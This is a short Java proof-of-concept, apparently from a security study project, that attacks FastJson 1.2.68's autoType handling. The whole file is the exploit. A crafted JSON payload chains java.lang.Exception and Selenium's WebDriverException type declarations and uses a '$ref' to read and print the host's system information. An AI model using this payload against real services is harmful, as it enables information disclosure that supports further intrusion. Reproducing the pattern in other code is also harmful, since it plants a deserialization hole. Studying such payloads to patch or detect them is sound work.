package com.jemmy.serialize.leak;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * FastJson 1.2.68
 * 开启了autoType
 *
 * @author zhujiang.cheng
 * @since 2020/6/3
 */
public class ExceptionAttack {

    static {
//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
    }

    public static void main(String[] args) {
        String json = "{\"x\":{\"@type\":\"java.lang.Exception\",\"@type\":\"org.openqa.selenium.WebDriverException\"},\"content\":{\"$ref\":\"$x.systemInformation\"}}";
        JSONObject jsonObject = JSON.parseObject(json);
        System.out.printf(jsonObject.getString("content"));
    }

}
